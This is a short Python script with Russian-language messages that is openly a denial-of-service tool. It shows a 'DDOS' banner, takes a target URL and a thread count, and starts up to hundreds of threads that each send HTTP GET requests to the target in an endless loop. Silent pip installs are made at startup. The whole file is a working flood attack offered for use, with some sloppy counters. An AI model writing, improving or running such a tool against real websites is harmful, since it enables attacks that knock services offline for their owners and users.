import os
import time
try: import requests
except:
    os.system('pip install requests')
    import requests
try: import threading
except:
    os.system('pip install threaded')
    import threading
try: from rich.console import Console
except:
    os.system('pip install rich')
    from rich.console import Console
try: from pystyle import Center
except:
    os.system('pip install pystyle')
    from pystyle import Center

def uclear():
    osname = os.name
    if osname == 'nt': os.system('cls')
    elif osname == 'posix': os.system('clear')

def print_baner():
    uclear()
    console = Console()
    console.print('██████╗ ██████╗  ██████╗ ███████╗', justify="center", style="white")
    console.print('██╔══██╗██╔══██╗██╔═══██╗██╔════╝', justify="center", style="white")
    console.print('██║  ██║██║  ██║██║   ██║███████╗', justify="center", style="blue")
    console.print('██║  ██║██║  ██║██║   ██║╚════██║', justify="center", style="blue")
    console.print('██████╔╝██████╔╝╚██████╔╝███████║', justify="center", style="red")
    console.print('╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝', justify="center", style="red")

def dos(target):
    count_atack = 0
    count_error = 0
    while True:
        console = Console()
        try:
            res = requests.get(target)
            print_baner()
            count_atack += 1
            console.print("[+]Отправленно запросов: ", int(count_atack), justify="center", style="cyan")
            console.print("[+]Произошло ошибок: ", int(count_atack), justify="center", style="red")
        except requests.exceptions.ConnectionError:
            count_error += 1
            console.print('[!]Connection error!', justify="center", style="red")
            console.print('[!]Ошибка подключения!\n\n', justify="center", style="red")
            time.sleep(3)

def start_DDoS():
    console = Console()
    print_baner()
    threads = 100

    url = input(Center.XCenter("[+]URL >> "))

    try:
        threads = int(input(Center.XCenter("[+]Потоки: ")))
    except ValueError:
        exit("[!]Неверное количество потоков!")

    if threads == 0:
        exit("[!]Неверное количество потоков!")

    if not url.__contains__("http"):
        exit("[!]URL-адрес не содержит http или https!")

    if not url.__contains__("."):
        exit("[!]Неверный домен")

    for i in range(0, threads):
        thr = threading.Thread(target=dos, args=(url,))
        thr.start()
        console.print('[+]' + str(i + 1) + " thread started!", justify="center", style="yellow")
        console.print('[+]' + str(i + 1) + " Потоков запущенно!", justify="center", style="yellow")

start_DDoS()